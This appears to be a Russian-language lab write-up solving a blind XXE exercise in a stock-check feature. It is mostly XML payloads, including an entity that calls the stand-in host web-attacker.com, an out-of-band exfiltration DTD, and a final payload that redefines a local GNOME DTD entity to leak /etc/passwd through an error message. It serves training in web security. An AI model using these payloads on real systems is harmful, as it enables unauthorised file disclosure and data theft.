В этой лабораторной работе есть функция «Проверка запасов», которая анализирует входные данные XML, но не отображает результат.

Для решения лабораторной работы вызовите сообщение об ошибке, содержащее содержимое файла `/etc/passwd`.

Вам необходимо будет сослаться на существующий файл DTD на сервере и переопределить сущность из него.
#### Намекать
Системы, использующие среду рабочего стола GNOME, часто имеют DTD, `/usr/share/yelp/dtd/docbookx.dtd`содержащий сущность, называемую `ISOamso.`


## Дано

уязвимость в функции «Проверка запасов»
уязвимость не отображает результат

Системы, использует среду рабочего стола GNOME, 
имеет DTD`/usr/share/yelp/dtd/ISOamso.dtd`
## Задача

содержимое файла `/etc/passwd`.


# Решение

Формат запроса
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```

добавляем внешнюю сущность посмотрим на поведение
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
	<!ENTITY % xxe SYSTEM "http://web-attacker.com"> 
	%xxe; 
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
- "XML parser exited with error: Process did not complete successfully" но на сервере видим активность

пробуем добавить полезную нагрузку 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
	<!ENTITY % xxe SYSTEM "file:///etc/hostname">> 
	%xxe; 
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
- "XML parser exited with error: org.xml.sax.SAXParseException; lineNumber: 3; columnNumber: 47; The markup declarations contained or pointed to by the document type declaration must be well-formed."

пробуем организовать полезную нагрузку на сервере 
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfile SYSTEM 'https://http://web-attacker.com/%file;'>">
```
- а нам не дан эксплоит так что увы и ах, работаем по сути задачи

Формируем запрос к локальной сущности
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
	<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; 
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
- Если бы сущности не было то мы бы получили `"XML parser exited with error: java.io.FileNotFoundException: /usr/share/yelp/dtd/ISOamso.dtd (No such file or directory)"`

Формируем преобразование локального `docbookx.dtd` файла а именно его сущности `ISOamso`
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
	<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> 
	<!ENTITY % ISOamso '
		<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
		 <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
		  &#x25;eval; 
		  &#x25;error; 
	'> 
	%local_dtd; 
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```

![[Pasted image 20250202143921.png]]